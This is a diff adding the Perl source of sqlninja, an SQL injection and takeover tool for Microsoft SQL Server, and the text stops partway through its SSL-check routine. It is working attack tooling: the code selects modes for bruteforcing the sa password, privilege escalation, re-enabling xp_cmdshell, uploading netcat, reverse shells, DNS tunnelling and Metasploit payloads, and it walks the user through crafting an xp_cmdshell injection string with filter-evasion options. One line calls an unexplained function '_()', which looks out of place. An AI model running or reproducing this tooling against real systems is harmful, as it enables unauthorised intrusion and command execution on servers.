@@ -1,0 +1,4233 @@
+#!/usr/bin/env perl 
+
+# sqlninja - SQL injection and takeover tool
+# Copyright (C) 2006-2010
+# http://sqlninja.sourceforge.net
+# icesurfer <r00t@northernfortress.net>
+# 
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License
+# as published by the Free Software Foundation; either version 2
+# of the License, or (at your option) any later version.
+# 
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+# 
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
+
+# Originally developed as a highly customized sql-based exploit
+# during a pen-test for a major financial institution (ciao Maurizio!),
+# to my surprise it became a more general purpose injection tool. Bah.
+
+# What my gentoo box is playing while I am releasing this version:
+# Backyard Babies - Payback
+
+use strict;
+use Config;
+use IO::Socket;
+use IO::Handle;
+use Getopt::Std;
+
+my $RELEASE = "0.2.5";
+
+# global variables that contain the configuration file options
+# You might say that global variables are bad, but what's more 
+# global than an option from a configuration file? :P
+my $host = "";
+my $port = "80";
+my $proxyhost = "";
+my $proxyport = "8080";
+my $vhost = "";
+my $page = "";
+my $stringstart = "";
+my $stringend = "";
+my $headers = "";
+my $filterconf = "";
+my $timeout = 5;
+my $ssl = "";
+my $method = "GET";
+my $lhost = "";
+my $dev = "eth0";
+my $domain;
+my $hostnamelen = 250;
+my $dnssock = "/tmp/.dnsninjasock";
+my $resolvedip = "10.255.255.254";
+my $xp_name = "xp_cmdshell";
+my $blindtime = 5;
+my $evasion = "0";
+# Process command line arguments
+my %options;
+my $ask;_();getopts('gvm:f:p:w:u:d:',\%options) or usage();
+my $genscript = "";
+my $verbose = $options{v};
+my $confile = $options{f} || "sqlninja.conf";
+my $password = $options{p} || "";
+my $wordlist = $options{w};
+my $user = $options{u};
+my $debug = $options{d};
+my $genscript = $options{g};
+my $errorstring = "";
+my $errorflag = 0;
+my $appendcomment = "--";
+my $msfpath = "";
+my $msfencoder = "";
+my $msfencodecount = 5;
+my $lines_per_req = 10; # script lines to upload with each request
+my $httpversion = 0;
+my $churrasco = 0;
+my $checkdep = "no";
+
+# Provide a friendly message for missing modules...
+my %nonStandardModules = (
+		"NetPacket-IP"             => "NetPacket::IP",
+		"NetPacket-TCP"            => "NetPacket::TCP",
+		"NetPacket-UDP"            => "NetPacket::UDP",
+		"IO-Socket-SSL"            => "IO::Socket::SSL",
+		"Net-Pcap"                 => "Net::Pcap",
+		"Net-RawIP"		   => "Net::RawIP",
+		"Net-DNS-Nameserver"	   => "Net::DNS::Nameserver",
+);
+
+while(my ($name,$module) = each %nonStandardModules) {
+	if (($> != 0) and ($name eq "Net-Pcap")) {
+		next;
+	}
+	if (($> != 0) and ($name eq "Net-DNS-Nameserver")) {
+		next;
+	}
+	if (($> != 0) and ($name eq "Net-RawIP")) {
+		next;
+	}
+	eval "use $module";
+	# The module isn't there
+	if ($@ =~ /Can't locate/) {
+		die "\nSeems that some module is missing...:\n".$@."\n";
+	}
+	if (($@ ne "") and ($verbose == 1)) {
+		print $@;
+	}
+}
+
+# Silly birthday function...
+my @timedata = localtime(time);
+if (($timedata[3] == 26) and ($timedata[4] == 0)) {
+	printf "-----------------------------------------------------------\n";
+	printf "Today is icesurfer's bday. What about a greetings email? :)\n";
+	printf "-----------------------------------------------------------\n";
+} elsif (($timedata[3] == 8) and ($timedata[4] == 1)) {
+	printf "----------------------------------------------------------\n";
+	printf "Today is sqlninja's bday. What about a greetings email? :)\n";
+	printf "----------------------------------------------------------\n";
+}
+
+print("Sqlninja rel. ".$RELEASE."\n");
+print("Copyright (C) 2006-2010 icesurfer <r00t\@northernfortress.net>\n");
+# Operation mode
+my $mode = $options{m};
+if (	$mode ne "test" && $mode ne "t" &&
+	$mode ne "fingerprint" && $mode ne "f" &&
+	$mode ne "bruteforce" && $mode ne "b" &&
+	$mode ne "escalation" && $mode ne "e" &&
+	$mode ne "resurrectxp" && $mode ne "x" &&
+	$mode ne "upload" && $mode ne "u" &&
+	$mode ne "dirshell" && $mode ne "s" &&
+	$mode ne "backscan" && $mode ne "k" &&
+	$mode ne "revshell" && $mode ne "r" &&
+	$mode ne "dnstunnel" && $mode ne "d" &&
+	$mode ne "sqlcmd" && $mode ne "c" &&
+	$mode ne "metasploit" && $mode ne "m") {
+		usage();
+		exit(1);
+	}
+
+if ((($mode eq "k") or ($mode eq "backscan")) and ($> != 0)) {
+	print "You need r00t privileges to run backscan mode...\n";
+	exit(0);
+}
+
+if ((($mode eq "d") or ($mode eq "dnstunnel")) and ($> != 0)) {
+	print "You need r00t privileges to run dnstunnel...\n";
+	exit(0);
+}
+
+if (($genscript == 1) and ($mode ne "upload") and ($mode ne "u")) {
+	print "[-] -g only works with upload mode. Ignoring it...\n";
+}
+
+if (($debug ne "") and
+    ($debug ne "1") and
+    ($debug ne "2") and
+    ($debug ne "3") and
+    ($debug ne "all")) {
+    	print "Unrecognized debug mode. Possible modes are:\n".
+	      " 1 - Print injected SQL command\n".
+	      " 2 - Print raw HTTP request\n".
+	      " 3 - Print raw HTTP response\n".
+	      " all - all of the above\n\n";
+	exit(0);
+}
+
+# Parse configuration file
+parsefile();
+
+if (($xp_name eq "NULL") and ($password eq "")) {
+	print "You need to specify the sa password when xp_name is NULL !\n";
+	exit(0);
+}
+
+# Children either signal when they are done via socket 
+# or they are killed by the parent
+$SIG{CHLD} = 'IGNORE';
+
+# Check whether to use SSL or not
+if ($ssl eq "auto") {
+	if ($proxyhost eq "") {
+		checkSSL();
+	} else {
+		print "[-] ssl can't be set to 'auto when using a proxy.\n";
+		if ($port eq "443") {
+			print "    Assuming encrypted connection\n";
+			$ssl = 1;
+		} else {
+			print "    Assuming cleartext connection\n";
+			$ssl = 0;
+		}
+	}	      
+} elsif ($ssl eq "yes") {
+	if ($verbose == 1) {
+		print "[v] Using SSL connection\n";
+	}
+	$ssl = 1;
+} elsif ($ssl eq "no") {
+	if ($verbose == 1) {
+		print "[v] Using cleartext connection\n";
+	}
+	$ssl = 0;
+# If we are here, it means that ssl wasn't specified at all. So we guess
+} elsif ($port eq "443") {
+	print "[+] Port 443... assuming SSL\n";
+	$ssl = 1;
+} else {
+	print "[+] Port ".$port.". Assuming cleartext\n";
+	$ssl = 0;
+}
+
+
+# What should we do anyway ?
+print "[+] Target is: ".$host."\n";
+if (($mode eq "test") || ($mode eq "t")) {
+	test();
+} elsif (($mode eq "fingerprint") || ($mode eq "f")) {
+	fingerprint();
+} elsif (($mode eq "bruteforce") || ($mode eq "b")) {
+	if ($password ne "") {
+		print "[-] bruteforce mode specified. Password will be ".
+		              "ignored\n";
+		$password = "";
+	}
+	brute();
+} elsif (($mode eq "escalation") || ($mode eq "e")) {
+	if ($password eq "") {
+		print "[-] password not specified... exiting\n";
+		exit(1);
+	}
+	if ($user ne "") {
+		print "[-] username is not needed from version 0.2.0\n";
+	}
+	escalation();
+} elsif (($mode eq "resurrectxp") || ($mode eq "x")) {
+	if ($xp_name eq "NULL") {
+		print "[-] xp_name can't be NULL to use this mode. Please upd".
+		      "ate conf file\n";
+		exit(0);
+	}
+        resurrectxp();
+} elsif (($mode eq "upload") || ($mode eq "u")) {
+	my $uplfile;
+	while ($uplfile eq "") {
+		print "  Binary or script file to upload:\n";
+		print "  shortcuts: 1=apps/nc.exe 2=apps/dnstun.exe 3=apps/churrasco.exe\n> ";
+		$uplfile = <STDIN>;
+		chomp $uplfile;
+		if ($uplfile eq "1") {
+			$uplfile = "apps/nc.exe";
+		} elsif ($uplfile eq "2") {
+			$uplfile = "apps/dnstun.exe";
+		} elsif ($uplfile eq "3") {
+			$uplfile = "apps/churrasco.exe";
+		}
+	}
+	upload($uplfile);
+} elsif (($mode eq "dirshell") || ($mode eq "s")) {
+	dirshell();
+} elsif (($mode eq "backscan") || ($mode eq "k")) {
+	backscan();
+} elsif (($mode eq "revshell") || ($mode eq "r")) {
+	revshell();
+} elsif (($mode eq "dnstunnel") || ($mode eq "d")) {
+	if ($domain eq "") {
+		print "[-] domain has not been specified... exiting\n";
+		exit(1);
+	}
+	dnstunnel();
+} elsif (($mode eq "sqlcmd") || ($mode eq "c")) {
+        sqlcmd();
+} elsif (($mode eq "metasploit") || ($mode eq "m")) {
+	metasploit();
+}
+
+exit(0);
+##############################################################################
+# Main program ends here
+##############################################################################
+
+# Parse options from configuration file
+sub parsefile
+{
+	unless (-e $confile) {
+		print "[-] ".$confile." does not exist. You want to create it".
+				" now ? [y/n]\n";
+		my $answer="";
+		while (($answer ne "y") and ($answer ne "n")) {
+			print "> ";
+			$answer=<STDIN>;
+			chomp $answer;
+		}
+		if ($answer eq "y") {
+			genconfig();
+		} else {
+			print "... see ya\n";
+			exit(0);
+		}
+	}
+	print "[+] Parsing configuration file................\n";
+	my $confline;
+	open(FILE,"<".$confile) || die "[-] Can't open configuration file...".
+						"exiting\n";
+	while ($confline = <FILE>) {
+		chomp($confline);
+		# comment line
+		if ($confline =~ m/^#\.*/) {
+			next;
+		}
+
+		# We start with parameters that might require spaces
+		
+		# errorstring
+		if ($confline =~ m/\s*errorstring\s*=\s*"(.+)"\s*/) {
+			$errorstring = $1;
+			if ($verbose == 1) {
+				print "  - custom error page string: \"".
+					$errorstring."\"\n";
+			}
+			next;
+		}
+		# stringstart
+		elsif ($confline =~ m/\s*stringstart\s*=(.+)/) {
+			$stringstart = $1;
+			# Remove spaces from beginning and end, if any
+			$stringstart =~ s/^\s+//;
+			$stringstart =~ s/\s+$//;
+			if ($verbose == 1) {
+				print "  - stringstart: ".$stringstart."\n";
+			}
+		}
+		# stringend
+		elsif ($confline =~ m/\s*stringend\s*=(.+)/) {
+			$stringend = $1;
+			$stringend =~ s/^\s+//;
+			$stringend =~ s/\s+$//;
+			if ($verbose == 1) {
+				print "  - stringend: ".$stringend."\n";
+			}
+		}
+		# tcpdump filter
+		elsif ($confline =~ m/\s*filter\s*=\s*(.+)\s*/) {
+			$filterconf = $1;
+			if ($verbose == 1) {
+				print "  - filterconf: ".$filterconf."\n";
+		        }
+		}
+		
+		# Now we can safely strip all spaces and simplify regexps
+		$confline =~ s/\s//g;
+		
+		# Host to connect to. 
+		# Yes, our victim....
+		if ($confline =~ m/^host=(\S+)/){
+			$host = $1;
+			if ($verbose == 1) {
+				print "  - Host: ".$host."\n";
+			}
+		}
+		# Port
+		elsif ($confline =~ m/^port=(\d+)/) {
+			$port = $1;
+			if ($verbose == 1) {
+				print "  - Port: ".$port."\n";
+			}
+		}
+		# SSL
+		elsif ($confline =~ m/^ssl=(\S+)/) {
+			if ($1 eq "yes") {
+				$ssl = "yes";
+				if ($verbose == 1) {
+					print "  - SSL: yes\n";
+				}
+			} elsif ($1 eq "no") {
+				$ssl = "no";
+				if ($verbose == 1) {
+					print "  - SSL: no\n";
+				}
+			} else {
+				$ssl = "auto";
+				if ($verbose == 1) {
+					print "  - SSL: auto\n";
+				}
+			}
+		}
+		#  Proxy host
+		elsif ($confline =~ m/^proxyhost=(\S+)/) {
+			$proxyhost = $1;
+			if ($verbose == 1) {
+				print "  - Proxy host: ".$proxyhost."\n";
+			}
+		}
+		# Proxy port
+		elsif ($confline =~ m/^proxyport=(\d+)/) {
+			$proxyport = $1;
+			if ($verbose == 1) {
+				print "  - Proxy port: ".$proxyport."\n";
+			}
+		}
+		# page
+		elsif ($confline =~ m/^page=(\S+)/) {
+			$page = $1;
+			if ($verbose == 1) {
+				print "  - page: ".$page."\n";
+			}
+		}
+		# http method to use
+		elsif ($confline =~ m/^method=(\w+)/) {
+			if ($1 eq "GET") {
+				$method = "GET";
+				if ($verbose == 1) {
+					print "  - method: GET\n";
+				}
+			} elsif ($1 eq "POST") {
+				$method = "POST";
+				if ($verbose == 1) {
+					print "  - method: POST\n";
+				}
+			} else {
+				print "[-] ".$1." method unknown/unsupported. ".
+							"Using GET\n";
+				$method = "GET";
+			}
+		}
+		# headers
+		elsif ($confline =~ m/^--headers_start--/) {
+			my $line;
+			$line = <FILE>;
+			while ($line !~ m/^--headers_end--/) {
+				if ($line =~ m/^Host:\s*(\S+)/) {
+					$vhost = $1;
+				} else {
+					$headers = $headers.$line;
+				}
+				$line = <FILE>;
+			}
+		}
+		# device to sniff in backscan mode
+		elsif ($confline =~ m/^device=(\S+)/) {
+			$dev = $1;
+			if ($verbose == 1) {
+				print "  - sniff device: ".$dev."\n";
+			}
+		}
+		# local host 
+		elsif ($confline =~ m/lhost=(\S+)/) {
+			$lhost = $1;
+			if ($verbose == 1) {
+				print "  - local host: ".$lhost."\n";
+			}
+		}
+		# domain for dnstunnel
+		elsif ($confline =~ m/^domain=(\S+)/) {
+			$domain = $1;
+			if ($verbose == 1) {
+				print "  - domain: ".$domain."\n";
+			}
+		}
+		# timeout for backscan 
+		elsif ($confline =~ m/^timeout=(\d+)/) {
+			$timeout = $1;
+			if ($verbose == 1) {
+				print "  - timeout: ".$timeout."\n";
+			}
+		}
+		# hostnamelen
+		elsif ($confline =~ m/^hostnamelength=(\d+)/) {
+			if (($1 > 39) and ($1 < 256)) {
+				$hostnamelen = $1;
+				if ($verbose == 1) {
+					print "  - hostnamelength: ".
+							$hostnamelen."\n";
+				}
+			}
+		}
+		# resolved ip
+		elsif ($confline=~m/^resolvedip=(\d+)\.(\d+)\.(\d+)\.(\d+)$/){
+			$resolvedip = $1.".".$2.".".$3.".".$4;
+			if ((($1 < 1) or ($1 > 255)) ||
+			    (($2 < 0) or ($2 > 255)) ||
+			    (($3 < 0) or ($3 > 255)) ||
+			    (($4 < 0) or ($4 > 255))) {
+			    	$resolvedip = "10.255.255.254";
+			}
+			if ($verbose == 1) {
+				print "  - resolved IP: ".$resolvedip."\n";
+			}
+		}
+		# xp_name
+		elsif ($confline=~m/^xp_name=(\S+)/) {
+			$xp_name = $1;
+			if ($verbose == 1) {
+				print "  - xp_name: ".$xp_name."\n";
+			}
+		}
+		# blind injection time
+		elsif ($confline=~m/^blindtime=(\d+)/) {
+			if (($1 > 2) and ($1 < 60)) { # back to school, silly!
+				$blindtime = $1;
+				if ($verbose == 1) {
+					print "  - blindtime: ".$blindtime."\n";
+				}
+			}
+		}
+		# append comment
+		elsif ($confline=~m/^appendcomment=(\S+)/) {
+			if ($1 eq "no") {
+				$appendcomment = "";
+			}
+			if ($verbose == 1) {
+				if ($appendcomment eq "") {
+					print "  - append comment: no\n";
+				} else {
+					print "  - append comment: yes\n";
+				}
+			}
+		}
+		# evasion techniques
+		elsif ($confline=~m/^evasion=([1-4]+)$/) {
+			$evasion = $1;
+		}
+		# msf path
+		elsif ($confline=~m/^msfpath=(\S+)$/) {
+			$msfpath = $1;
+			unless ($msfpath=~m/\/$/) {
+				$msfpath = $msfpath."/";
+			}
+		}
+		# script lines to upload per request
+		elsif ($confline=~m/^lines_per_request=(\d+)$/) {
+			if (($1 > 0) and ($1 < 31)) {
+				$lines_per_req = $1;
+			}
+		}
+		# HTTP version
+		elsif ($confline=~m/^httpversion=(\S+)$/) {
+			if ($1 eq "1.1") {
+				$httpversion = 1;
+			}
+			if ($verbose == 1) {
+				if ($httpversion == 0) {
+					print "  - using HTTP/1.0\n";
+				} else {
+					print "  - using HTTP/1.1\n";
+				}
+			}
+		}
+		# Whether to use churrasco.exe
+		elsif ($confline=~m/^usechurrasco=(\S+)$/) {
+			if ($1 eq "yes") {
+				$churrasco = 1;
+				if ($verbose == 1) {
+					print "  - churrasco.exe enabled\n";
+				}
+			}
+		}
+		# msf encoder to use
+		elsif ($confline=~m/^msfencoder=(\S+)$/) {
+			$msfencoder = $1;
+			if ($verbose == 1) {
+				print "  - msfencoder to use: ".$msfencoder."\n";
+			}
+		}
+		# number of times to encode the msf payload
+		elsif ($confline=~m/^msfencodecount=(\d+)$/) {
+			if ($1 > 0) {
+				$msfencodecount=$1;
+				if ($verbose == 1) {
+					print "  - msf payload will be encoded ".
+						$msfencodecount." times\n";
+				}
+			}
+		}
+		# whether to handle DEP via xp_regwrite
+		elsif ($confline=~m/checkdep=(\S+)$/) {
+			if ($1 eq "yes") {
+				$checkdep = "yes";
+				if ($verbose == 1) {
+					print "  - DEP checking enabled\n";
+				}
+			}
+		}
+	}
+	close FILE;
+	if ($host eq "") {
+		print "[-] host not defined in ".$confile."\n";
+		exit (1);
+	}
+	if ($stringstart eq "") {
+		print "[-] no exploit string defined in ".$confile."\n";
+		exit (1);
+	}
+	if ($filterconf eq "") {
+		$filterconf = "src host ".$host." and dst host ".$lhost;
+	}
+	if ($vhost eq "") {
+		$vhost = $host;
+	}
+	if (($mode eq "5") or ($mode eq "dnstunnel")) {
+		if ($hostnamelen < (length($domain)+10)) {
+			print "[-] max hostname length too short\n";
+			exit(1);
+		}
+		if ($hostnamelen > 255) {
+			print "[-] max hostname length too long\n";
+			exit(1);
+		}
+	}
+	if ($evasion =~ /[1-4]/) {
+		print "[+] Evasion technique(s):\n";
+		if ($evasion =~ /1/) {
+			print "    - query hex-encoding\n";
+		}							                        if ($evasion =~ /2/) {
+		        print "    - comments as separator\n";
+		}
+		if ($evasion =~ /3/) {
+		        print "    - random case\n";
+		}
+		if ($evasion =~ /4/) {
+		        print "    - random URI encoding\n";
+		}
+	}
+}
+
+sub genconfig
+{
+	my $configuration = "###################################\n".
+	                    "#   SQLNINJA CONFIGURATION FILE   #\n".
+			    "###################################\n\n".
+	      	"# WARNING 1: options are case sensitive\n".
+		"# WARNING 2: don't forget to URL-encode, when needed. This ".
+		"applies to:\n# - page\n# - stringstart\n# - stringend\n".
+		"# see sqlninja-howto.html for more information and examples".
+		"\n\n".
+		"# Host (required)\n".
+		"host = ";
+	print "[+] Creating a new configuration file. Keep in mind that only ".
+	   "basic options\n    will be generated, and that the file should be ".
+	   "manually edited for advanced\n    options and fine tuning.\n";
+	print "\n[1/10] Victim host (e.g.: www.victim.com):\n";
+	my $i = "";
+	while ($i eq "") {
+		print "> ";
+		$i = <STDIN>;
+		chomp $i;
+	}
+	$configuration = $configuration.$i."\n\n";
+	
+	$configuration .= "# Port (optional, default: 80)\n";	
+	print "\n[2/10] Remote port [80]\n> ";
+	$i = <STDIN>;
+	chomp $i;
+	if ($i eq "") {
+		$configuration .= "port = 80\n\n";
+	} else {
+		$configuration .= "port = ".$i."\n\n";
+	}
+
+	$configuration .= "# Use SSL (yes/no/auto. Default: no)\n";
+	print "\n[3/10] Use SSL (y/n/auto) [no]\n";
+	$i = "-1";
+	while (($i ne "") and
+	       ($i ne "y") and
+	       ($i ne "n") and
+	       ($i ne "auto")) {
+		print "> ";
+		$i = <STDIN>;
+		chomp($i);
+	}
+	if ($i eq "y") {
+		$configuration .= "ssl = yes\n\n";
+	} elsif ($i eq "auto") {
+		$configuration .= "ssl = auto\n\n";
+	} else {
+		$configuration .= "ssl = no\n\n";
+	}
+
+	$configuration .= "# Method to use (optional, default: GET)\n";
+	print "\n[4/10] Method to use (GET/POST) [GET]\n";
+	$i = "-1";
+	while (($i ne "") and
+	       ($i ne "GET") and
+	       ($i ne "POST")) {
+	       	print "> ";
+		$i = <STDIN>;
+		chomp($i);
+	}
+	if ($i eq "POST") {
+		$configuration .= "method = POST\n\n";
+	} else {
+		$configuration .= "method = GET\n\n";
+	}
+
+	$configuration .= "# Vulnerable page (e.g.: /dir/target.asp)\n";
+	print "\n[5/10] Vulnerable page, including path and leading slash \n(e.g.: /dir/target.asp)\n> ";
+	$i = <STDIN>;
+	chomp $i;
+	$configuration .= "page = ".$i."\n\n";
+
+	$configuration .= "# Start of the exploit string. It must include ".
+	      "the vulnerable parameter\n# and the  character sequence that ".
+	      "allows us to start injecting commands. In\n".
+	      "# general this means, at least:\n".
+	      "# - an apostrophe (if the parameter is a string)\n".
+	      "# - a semicolon (to end the original query)\n".
+	      "# It must also include everything necessary to properly close".
+	      " the original\n# query, like an appropriate number of closing ".
+	      "brackets. Don't forget \n# to URL-encode, where needed (e.g.".
+	      " spaces)\n".
+	      "# For instance, if we consider the following TSQL command:\n".
+	      "#    exec master..xp_cmdshell 'dir c:\\'\n".
+	      "# and the string to inject is the following:\n".
+	      "#    aaa=1&bbb=x';exec+master..xp_cmdshell+'dir+c:\'\n".
+	      "# this parameter should look like this:\n".
+	      "#    stringstart = aaa=1&bbb=x';\n";
+	print "\n[6/10] Start of the exploit string. It must include the ".
+	"vulnerable parameter \nand the character sequence that allows us ".
+	"to start injecting commands. In\ngeneral this means, at least:\n".
+	  " - an apostrophe (if the parameter is a string)\n".
+	  " - a semicolon (to end the original query)\n".
+	  "It must also include everything necessary to properly close the ".
+	  "original query,\nas an appropriate number of closing brackets.".
+	  " Don't forget to URL-encode,\nwhere needed (e.g.: spaces).\n".
+	  "For instance, if we consider the following TSQL command:\n".
+	  "    exec master..xp_cmdshell 'dir c:\\'\n".
+	  "and the string to inject is the following:\n".
+	  "    aaa=1&bbb=x';exec+master..xp_cmdshell+'dir+c:\'\n".
+	  "this parameter should look like this:\n".
+	  "    aaa=1&bbb=x';\n> ";
+	$i = <STDIN>;
+	chomp $i;
+	$configuration .= "stringstart = ".$i."\n\n";
+
+	$configuration .= "# If you need to add some more parameters after ".
+	   "the vulnerable one, put\n# them here (don't forget the leading ".
+	   "\"&\" sign). This option can also be \n".
+	   "# used when commenting the rest of the original query does not ".
+	   "work and you\n# need to add some SQL code instead. If this is the".
+	   " case, you need to set\n# \"appendcomment\" option to \"no\". ".
+	   "Don't forget the leading \"&\" sign and\n# to URL-encode, where ".
+	   "needed.\n# ".
+	   "e.g.: stringend = &param3=aaa\n";
+	print "\n[7/10] If you need to add some more parameters after the ".
+	"vulnerable one, put\nthem here (don't forget the leading \"&\" sign ".
+	"and to URL-encode where needed).\ne.g.: &param3=aaa\n> ";
+	$i = <STDIN>;
+	chomp $i;
+	$configuration .= "stringend = ".$i."\n\n";
+
+	$configuration .= "# Local host: your IP address (for backscan and".
+		" revshell modes)\n";
+	print "\n[8/10]  Local host: your IP address (for backscan and".
+	                " revshell modes)\n> ";
+	$i = <STDIN>;
+	chomp $i;
+	$configuration .= "lhost = ".$i."\n\n";
+	
+	$configuration .= "# Interface to sniff when in backscan mode\n";
+	print "\n[9/10] Interface to sniff when in backscan mode\n> ";
+	$i = <STDIN>;
+	chomp $i;
+	$configuration .= "device = ".$i."\n\n";
+
+	$configuration .= 
+	 "# Evasion techniques to be used. Possible choices are:\n".
+	 "# 1 - Query hex-encoding\n# 2 - Comments as separators\n".
+	 "# 3 - Random case\n# 4 - Random URI encoding\n".
+	 "# All techniques can be combined, so the following is legal:\n".
+	 "# evasion = 1234\n# However, keep in mind that using too many ".
+	 "techniques at once leads to very\n# long queries, that might ".
+	 "create problems when using GET. Default: no evasion\n";
+	print "\n[10/10] Evasion techniques. Possible choices are:\n".
+	 "  1 - Query hex-encoding\n  2 - Comments as separators\n".
+	 "  3 - Random case\n  4 - Random URI encoding\n".
+	 "All techniques can be combined, so for instance you can enter ".
+	 "\"1234\" (without\nquotes). However, keep in mind that using too ".
+	 "many techniques at once leads to\nvery long queries, that might ".
+	 "create problems when using GET.\nDefault: 0 (no evasion)\n> ";
+	$i = <STDIN>;
+	chomp $i;
+	$configuration .= "evasion = ".$i."\n\n";
+
+	$configuration .=
+	 "# Path to metasploit executable. Only needed if msfpayload and\n".
+	 "# msfcli are not already in the path\n".
+	 "# msfpath = /some/dir/\n\n".
+	 "# Encoder to use with msfencode. If the option is not present, ".
+	 "no encoding\n# is used. However, it's definitely recommended to ".
+	 "use it, if you suspect that\n# an AV is present. A list of ".
+	 "available encoders can be retrieved by simply\n# running \"".
+	 "msfencoder -l\"\n# msfencoder = x86/shikata_ga_nai\n\n".
+	 "# Number of times to encode the metasploit payload. Default: 5\n".
+	 "# msfencodecount = 5\n\n".
+	 "# If you can execute commands but SQL Server does not run as ".
+	 "SYSTEM,\n# you can use churrasco.exe to steal the appropriate ".
+	 "token and escalate\n# privileges. Enable this option to use ".
+	 "churrasco.exe before executing\n# a command. This is especially".
+	 " useful with the metasploit module and VNC\n# Obviously, you ".
+	 "first need to upload churrasco.exe using\n# the upload module.".
+	 "Default: no\n# usechurrasco = no\n\n".
+	 "# Proxy host to use (default: none)\n".
+	 "# proxyhost = x.x.x.x\n\n".
+	 "# Proxy port to use (default: 8080)\n".
+	 "# proxyport = 8080\n\n".
+	 "# Additional headers to include into the request. E.g.:\n".
+	 "# Host: www.test.com\n# Connection: close\n".
+	 "# Cookie: ASPSESSIONID=xxxxxxxxxxxxxxxxxxxx\n".
+	 "# Authorization: Basic yyyyyyyyyyyyyyyyyyyyy\n".
+	 "# Important: Do not remove \"--headers_start--\" and ".
+	 "\"--headers_end--\"\n".
+	 "--headers_start--\nUser-Agent: Mozilla/5.0 (X11; U; Linux ".
+	 "i686; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8\n".
+	 "Accept: text/xml,application/xml,application/xhtml+xml,text/".
+	 "html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n".
+	 "Accept-Language: en-us,en;q=0.7,it;q=0.3\n".
+	 "Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\n".
+	 "Content-Type: application/x-www-form-urlencoded\n".
+	 "Connection: close\n".
+	 "--headers_end--\n\n".
+	 "# Domain to use for dnstunnel mode\n".
+	 "domain = sqlninja.net\n\n".
+	 "# tcpdump filter (optional)\n".
+	 "# filter = src host x.x.x.x\n\n".
+	 "# Backscan timeout after web request conclusion (Default: 5 secs)\n".
+	 "# timeout = 5\n\n".
+	 "# Maximum hostname length for DNS tunnel (Max: 250 - Default: 250)\n".
+	 "# hostnamelength = 250\n\n".
+	 "# IP address to return to DNS queries (default: 10.255.255.254)\n".
+	 "# resolvedip = 10.255.255.254\n\n".
+	 "# Name of the procedure to use/create to launch commands. Default ".
+	 "is\n# \"xp_cmdshell\". If set to \"NULL\", openrowset+sp_oacreate ".
+	 "will be used\n# for each command\n".
+	 "# xp_name = xp_cmdshell\n\n".
+	 "# Time value for the WAITFOR during inference attack of ".
+	 "fingerprint and\n# bruteforce mode. A higher value makes things ".
+	 "slower but will yeld more\n# precise results against slow targets.\n". 
+	 "# Min: 3 seconds. Max: 59 seconds. Default: 5 seconds\n".
+	 "# blindtime = 5\n\n".
+	 "# Number of script lines to upload with a single HTTP request. A ".
+	 "higher number\n# obviously means a faster upload. However, do not ".
+	 "push this too high if your\n# request contains very long parameters.".
+	 "Maximum is 30, and 10 is a default\n# safe value providing already a".
+	 "good speed\n# lines_per_request = 10\n\n".
+	 "# If the remote server returns a custom error page instead of a ".
+	 "standard\n# HTTP error code (e.g. 500 Server Error), it is wise ".
+	 "to set this value to\n# some string that is present in such a ".
+	 "page. This will help sqlninja in\n# figuring out if things seem ".
+	 "to be wrong\n# errorstring = \"an error has occurred\"\n\n".
+	 "# By default, sqlninja appends two hyphens to the injected query ".
+	 "in order\n# to comment out any spurious SQL code. This is good and ".
+	 "works in\n# approximately 99% of the cases. However, you might ".
+	 "want to change this\n# behavior in some very specific scenarios. ".
+	 "Change this setting only if you\n# really know what you are doing,".
+	 "\n# Possible values: yes/no\n# appendcomment = yes\n\n".
+	 "# By default, sqlninja uses HTTP version 1.0, which should be ".
+	 "ok for\n# pretty much all webservers out there. If for some ".
+	 "reason you need to\n# use HTTP 1.1, specify it here.\n".
+	 "# In case you use HTTP 1.1, add a \"Connection: close\" ".
+	 "header in the\n# headers section of the configuration file\n".
+	 "# httpversion = 0\n\n# When using the Metasploit module DEP is ".
+	 "not a problem anymore, since in\n# all recent versions of the ".
+	 "framework the stager will take care of it by\n# itself. However, ".
+	 "if needed you can still roll back to the old sqlninja\n# behavior ".
+	 "and disable DEP by whitelisting the stager with a call to\n".
+	 "# xp_regwrite. To do so, set 'checkdep' to 'yes'\n".
+	 "# checkdep = no\n\n";
+	open(FILE,">".$confile) || die "[-] Can't write configuration file...".
+	                                                "exiting\n";
+	print FILE $configuration;
+	close FILE;
+	print "\n[+] ".$confile." written successfully\n";
+}
+
+# check whether we are talking with an SSL server or not
+# The whole fork() thing is needed because some non-SSL servers make 
+# IO::Socket::SSL->new hang indefinitely (even nikto has this problem, at 
+# least with my libraries) and I really want the Ninja to be able to figure 
+# out whether it is SSL or not by itself
+sub checkSSL
+{
+	print "[+] Checking whether the remote server uses SSL\n";
+	my $ninjasock = genfile();
+	unlink $ninjasock;
+	if ($verbose == 1) {
+		print "  [v] Creating UNIX socket for SSL check\n";
+	}
+	my $server = new IO::Socket::UNIX->new(Local => $ninjasock,
+					       Type  => SOCK_DGRAM,
+					       Listen   => 5)
+				|| die "can't create UNIX socket: $!\n";
+	if ($verbose == 1) {
+		print "  [v] Forking SSL connection child\n";
+	}
+	my $sslpid = fork();
+	if ($sslpid == -1) {
+		$server->close;
+		unlink $ninjasock;
+		print "can't fork child process\n";
+		exit(1);
+	}
+	if ($sslpid == 0) {
+		$server->close;
+		if ($verbose == 1) {
+			print "  [v] Attempting SSL connection\n";
+		}
+		my $s = IO::Socket::SSL->new(
+				PeerAddr => $host,
+				PeerPort => $port,
+				Timeout  => 1 );
+		if (defined $s) {
+			my $k=IO::Socket::UNIX->new(Peer => $ninjasock,
+						    Type     => SOCK_DGRAM,
+						    Timeout  => 10)
+				|| die "could not create UNIX socket\n";
+			$k->send("ssl");
+			close $k;
+		}
+		# It's unbelievable how some stupid bugs can go unnoticed
+		# for a whole bunch of widely used releases....
+		exit(0);
+	}
+	my $timeoutpid = fork();
+	if ($timeoutpid == -1) {
+		$server->close;
+		unlink $ninjasock;
+		print "can't fork child process \n";
+		exit(1);
+	}
+	if ($timeoutpid == 0) {
+		$server->close;
+		sleep(5);
